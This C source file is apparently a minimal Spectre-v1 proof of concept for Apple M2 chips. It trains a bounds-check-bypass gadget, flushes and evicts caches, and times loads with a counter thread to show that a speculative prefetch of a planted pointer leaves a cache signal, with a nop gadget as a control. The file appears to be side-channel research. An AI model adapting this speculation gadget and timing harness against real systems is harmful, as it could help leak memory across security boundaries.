// minimal_prfm_signal.c - Spectre-v1 + prfm transient-consumer signal.
//
// demonstrates: a bounds-check-bypassed 64-bit pointer load, followed by a
// single `prfm pldl1keep [ptr]`, warms the page at the planted pointer even
// after architectural rollback on the tested patched M2 system. flushing the
// planted pointer to DRAM before each trial widens the speculation window and
// strengthens the signal.
//
// trials are INTERLEAVED (random plant per trial, not blocked) to avoid
// back-to-back decay confounds.
//
// build/run: make run-minimal
//
// expected on the tested patched M2 system:
//   prfm cold   ~> combined delta +10 to +40 across 8000 interleaved trials
//   nop control ~> combined delta  -5 to  +5

#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BOUND       16
#define PLANT_X     18
#define TRIALS      8000
#define TRAIN_RNDS  30
#define PAGE_SZ     16384
#define L2_SZ       (32 * 1024 * 1024)

static volatile uint64_t g_ticks;
static volatile int g_run;
static void *tick_fn(void *a) {
    (void)a;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (g_run) g_ticks++;
    return NULL;
}
static inline void bar(void) { __asm__ volatile("dsb sy\n\tisb" ::: "memory"); }
static inline uint64_t tl(volatile uint8_t *p) {
    bar(); uint64_t a = g_ticks; bar();
    volatile uint8_t v = *p;
    __asm__ volatile("" :: "r"(v) : "memory");
    bar(); uint64_t b = g_ticks; return b - a;
}
static inline void cfl(void *p) { __asm__ volatile("dc civac, %0" :: "r"(p) : "memory"); }

static uint64_t victim[BOUND + 4] __attribute__((aligned(128)));
static volatile uint64_t *bound_p;
static uint8_t *D, *S0, *S1, *l2buf;

__attribute__((noinline))
static void gadget_prfm(uint64_t x) {
    if (x < *bound_p) {
        uint8_t *p = (uint8_t *)victim[x];
        __asm__ volatile("prfm pldl1keep, [%0]" :: "r"(p) : "memory");
    }
}
__attribute__((noinline))
static void gadget_nop(uint64_t x) {
    if (x < *bound_p) { __asm__ volatile("nop" ::: "memory"); }
}

static void evict(void) {
    volatile uint64_t s = 0;
    for (size_t i = 0; i < L2_SZ; i += 128) s ^= l2buf[i];
    (void)s; bar();
}

static double clock_ghz(void) {
    mach_timebase_info_data_t tb; mach_timebase_info(&tb);
    uint64_t t0 = mach_absolute_time();
    volatile uint64_t x = 0;
    __asm__ volatile("1:\n\tadd %0,%0,#1\n\tsubs %1,%1,#1\n\tb.ne 1b"
                     : "+r"(x) : "r"((uint64_t)500000000) :);
    return 500000000.0 / ((mach_absolute_time() - t0) * tb.numer / tb.denom);
}

static void run_interleaved(void (*gadget)(uint64_t), int cold, int counts[2][3]) {
    memset(counts, 0, sizeof(int) * 6);
    for (int t = 0; t < TRIALS; t++) {
        int plant = rand() & 1;
        victim[PLANT_X] = plant ? (uint64_t)S1 : (uint64_t)S0;

        for (int r = 0; r < TRAIN_RNDS; r++) gadget(rand() & 0xf);

        cfl(S0); cfl(S1); bar(); evict();
        cfl((void *)bound_p); bar();
        if (cold) { cfl(&victim[PLANT_X]); bar(); evict(); }
        for (int i = 0; i < BOUND; i++)
            __asm__ volatile("" :: "r"(victim[i]) : "memory");
        __asm__ volatile("" :: "r"(D[0]) : "memory");
        bar();

        gadget(PLANT_X);

        uint64_t td = tl(D), t0v = tl(S0), t1v = tl(S1);
        int w = 0; uint64_t best = td;
        if (t0v < best) { best = t0v; w = 1; }
        if (t1v < best) { best = t1v; w = 2; }
        counts[plant][w]++;
    }
}

int main(void) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    // retry until P-core
    double ghz;
    for (int att = 0; att < 10; att++) {
        ghz = clock_ghz();
        if (ghz >= 3.0) break;
        if (att == 9) { fprintf(stderr, "stuck on E-core after 10 tries\n"); return 2; }
        usleep(100000);
    }

    g_run = 1;
    pthread_t tid; pthread_create(&tid, NULL, tick_fn, NULL);
    while (!g_ticks) {} usleep(10000);

    // three separate mmaps ~> OS scatters VAs across the address space.
    // no multi-GB arena needed.
    D  = mmap(NULL, PAGE_SZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    S0 = mmap(NULL, PAGE_SZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    S1 = mmap(NULL, PAGE_SZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    D[0] = 1; S0[0] = 2; S1[0] = 3;

    l2buf = mmap(NULL, L2_SZ, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(l2buf, 1, L2_SZ);

    void *bp = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    bound_p = bp; *bound_p = BOUND;
    for (int i = 0; i < BOUND; i++) victim[i] = (uint64_t)D;

    srand(0xDEAD);
    int c_prfm[2][3], c_nop[2][3];

    run_interleaved(gadget_prfm, 1, c_prfm);
    run_interleaved(gadget_nop,  1, c_nop);

    int p_dS0 = c_prfm[0][1] - c_prfm[1][1];
    int p_dS1 = c_prfm[1][2] - c_prfm[0][2];
    int n_dS0 = c_nop[0][1]  - c_nop[1][1];
    int n_dS1 = c_nop[1][2]  - c_nop[0][2];

    printf("Spectre-v1 + prfm signal  (tested patched M2 system)\n");
    printf("clock=%.2f GHz (P-core)   trials=%d (interleaved)\n\n", ghz, TRIALS);
    printf("prfm (cold plant):\n");
    printf("  plant=S0: D=%d S0=%d S1=%d\n", c_prfm[0][0], c_prfm[0][1], c_prfm[0][2]);
    printf("  plant=S1: D=%d S0=%d S1=%d\n", c_prfm[1][0], c_prfm[1][1], c_prfm[1][2]);
    printf("  delta(S0)=%+d  delta(S1)=%+d  combined=%+d\n\n", p_dS0, p_dS1, p_dS0+p_dS1);
    printf("nop control (cold plant, no consumer):\n");
    printf("  plant=S0: D=%d S0=%d S1=%d\n", c_nop[0][0], c_nop[0][1], c_nop[0][2]);
    printf("  plant=S1: D=%d S0=%d S1=%d\n", c_nop[1][0], c_nop[1][1], c_nop[1][2]);
    printf("  delta(S0)=%+d  delta(S1)=%+d  combined=%+d\n\n", n_dS0, n_dS1, n_dS0+n_dS1);
    printf("verdict: prfm %s  |  nop %s\n",
           (p_dS0+p_dS1 > 5) ? "SIGNAL" : "noise",
           (n_dS0+n_dS1 > 5) ? "SIGNAL" : "noise");

    g_run = 0; pthread_join(tid, NULL);
    return 0;
}
